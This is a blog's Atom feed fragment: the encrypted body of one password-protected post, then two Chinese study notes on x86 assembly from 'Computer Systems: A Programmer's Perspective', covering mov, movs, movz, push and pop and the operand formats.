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 </div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="college" scheme="http://yoursite.com/categories/college/"/>
    
    
      <category term="college" scheme="http://yoursite.com/tags/college/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-2</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-2/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-汇编的世界-2/</id>
    <published>2018-05-05T20:47:06.000Z</published>
    <updated>2018-05-05T13:13:58.093Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>据传送指令的目的是为了将一个数据从一个位置复制到另外一个位置。既然如此，那么数据传送指令就会包含一个源操作数和一个目的操作数，指令会将原操作数的值复制到目的操作数并覆盖。</p>
<p>数据传送指令一共可分为五种，分别是<code>mov</code>、<code>movs</code>、<code>movz</code>、<code>push</code>以及<code>pop</code>。</p>
<h3 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h3><p>mov指令的作用是将源操作数S中的数据复制到目的操作数D中，mov指令有一个数据格式和两个操作数，因此一般的形式为[movx S D]。其中x为数据格式，S为源操作数，D为目的操作数。</p>
<p>这里举一个简单的例子，比如我们有一条指令为<code>movl %edx %eax</code>。那么它的执行过程就如下图所示。</p>
<p><img src="/images/汇编-06.png" alt="mov指令"></p>
<p>可以看到，在指令执行之后，%edx寄存器当中的内容会被复制到%eax寄存器。需要一提的是，mov指令可以在后面加上任何数据格式，比如上面这一过程中，数据格式则为四个字节，也就是双字。因此不难推断出，我们还可以使用movb和movw去复制一个字节或者两个字节。</p>
<h3 id="movs指令"><a href="#movs指令" class="headerlink" title="movs指令"></a>movs指令</h3><p>movs指令的作用是将源操作数S中的数据做符号扩展后，再复制到目的操作数D中，movs指令有两个数据格式和两个操作数，因此一般的形式为[movsxy S D]。其中x、y为数据格式，S为源操作数，D为目的操作数。其中x、y的组合一共有三种，分别是bw、bl、wl，这三个组合代表的意思分别是单字节到双字节，单字节到双字以及双字节到双字。</p>
<p>对于指令<code>movswl %dx %eax</code>来讲，它的作用如下图所示。</p>
<p><img src="/images/汇编-07.png" alt="movs指令"></p>
<p>这里为了可以看出符号位的扩展，因此LZ这里使用了十六进制的整数表示方式。可以看到，movs指令将0x8FFF扩展以后存入%eax寄存器，其中%dx为寄存器%edx的后16位表示。</p>
<h3 id="movz指令"><a href="#movz指令" class="headerlink" title="movz指令"></a>movz指令</h3><p>movz指令的作用是将源操作数S做零扩展后，再复制到目的操作数中。它与movs指令十分相似，也有两个数据格式和两个操作数，因此一般的形式为[movzxy S D]。其中x、y为数据格式，S为源操作数，D为目的操作数。其中x、y的组合一共有三种，分别是bw、bl、wl，这三个组合代表的意思分别是单字节到双字节，单字节到双字以及双字节到双字。</p>
<p>这里依然采用相似的示例，我们来看看对于指令<code>movzwl %dx %eax</code>来讲，它的作用与上面的movs有何不同。</p>
<p><img src="/images/汇编-08.png" alt="movz指令"></p>
<p>可以看出，movz与movs指令是十分相似的，只是这里扩展后，目标寄存器%eax的前16位为0而不再是1。</p>
<h3 id="push指令"><a href="#push指令" class="headerlink" title="push指令"></a>push指令</h3><p>push指令与上面的mov族指令有着不同，它的目的操作数被固定为栈顶，因此它的指令当中没有目的操作数。另外有一点需要注意的是，它在进行复制操作之前，需要移动栈顶指针（-4）。push指令的一般形式为[pushl S]，其中l代表数据格式为双字，S为源操作数，目的操作数默认为栈顶。</p>
<p>这里举一个简单的例子，比如<code>pushl %edx</code>这条命令，它的任务是将%edx寄存器的值复制到栈顶。我们首先来看一下命令执行前，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-09.png" alt="push指令"></p>
<p>可以看到，寄存器%ebp和%esp分别指向帧指针和栈指针，而%esp实际上就是指向的栈顶。由于现在栈顶位于-16的位置，因此若要将%edx压入栈，则先需要将栈顶移动到-20的位置，然后再进行复制，移动后的状态如下图所示。</p>
<p><img src="/images/汇编-10.png" alt="push指令"></p>
<p>可以看到，这里栈指针的位置已经发生了变化，向下移动了四位，并且将%edx寄存器的值放入新的栈顶，因此pushl %edx指令就相当于下面两条指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">subl $4,%esp</div><div class="line">movl %edx,(%esp)</div></pre></td></tr></table></figure></p>
<p>###pop指令</p>
<p>pop指令与push指令是做的相反的操作，一个是入栈一个是出栈。对于pop指令来讲，它的源操作数被固定为栈顶，相反，它会先进行复制操作，然后再移动栈指针。pop指令的一般形式为[popl D]，其中l代表数据格式为双字，D为目的操作数，源操作数默认为栈顶。</p>
<p>接下来我们举一个例子，与上面的例子类似，我们考虑<code>popl %edx</code>这条指令的效果，它会将栈顶的值弹出到寄存器%edx。首先来看执行之前，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-11.png" alt="ppo指令"></p>
<p>接下来执行pop指令时，会先将栈顶的值复制到%edx，然后再将栈指针移动（+4）。我们来看一下它执行后的状态。</p>
<p><img src="/images/汇编-12.png" alt="ppo指令"></p>
<p>可以看到，之前栈顶的内容已经被弹出到%edx寄存器，并且当前栈顶已经移动到了-16的位置，也就是进行了+4操作。因此popl %edx指令就相当于下面两条指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">movl (%esp),%edx</div><div class="line">addl $4,%esp</div></pre></td></tr></table></figure></p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer15.html" target="_blank" rel="external">深入理解计算机系统（3.3）—数据传送（或者说复制）指令详解</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;数据传送指令&quot;&gt;&lt;a href=&quot;#数据传送指令&quot; class=&quot;headerlink&quot; title=&quot;数据传送指令&quot;&gt;&lt;/a&gt;数据传送指令&lt;/h3&gt;&lt;p&gt;据传送指令的目的是为了将一个数据从一个位置复制到另外一个位置。既然如此，那么数据传送指令就会包含一个源操作数
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-1</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-1/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-汇编的世界-1/</id>
    <published>2018-05-05T20:38:21.000Z</published>
    <updated>2018-05-05T12:46:53.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="汇编层次的对象"><a href="#汇编层次的对象" class="headerlink" title="汇编层次的对象"></a>汇编层次的对象</h3><p>在平时的开发过程中，CPU处理器的状态对开发者是隐藏的，我们看不到CPU当中各个对象的状态。但是在汇编语言中，我们可以清楚的看到这些对象的状态，其中CPU主要包含以下几个对象。</p>
<ul>
<li>程序计数器（PC）：记录下一条指令的地址。</li>
<li>整数寄存器文件：共8个，可以存储一些地址或者整数的数据。</li>
<li>条件寄存器：保存算数或逻辑指令的状态信息，可以实现程序的流程控制。</li>
<li>浮点寄存器：存储浮点数。</li>
</ul>
<p>　　可以看出，这些都是CPU处理器当中的对象，这是汇编层面能操作的寄存器，当然，还有一节寄存器是我们不能操作的，比如说时钟寄存器。</p>
<h3 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h3><p>在汇编指令中，有三种表示数据的格式：</p>
<ul>
<li>一种是$符号后跟一个标准C表示的整数，比如$100，$0x11等等</li>
<li>第二种则是寄存器，当它作为一个操作数的时候，则是取的寄存器当中的数值。另外，对于寄存器来说，也可以选择性的操作4个、2个、1个字节，而并不一定非要操作4个字节</li>
<li>最后一种，则是我们相对来说最熟悉的，就是存储器或者说内存。当它作为一个操作数的时候，会去计算存储器地址的数值，然后去这个地址取相应的数值。</li>
</ul>
<p><img src="/images/汇编-05.png" alt="数据格式"></p>
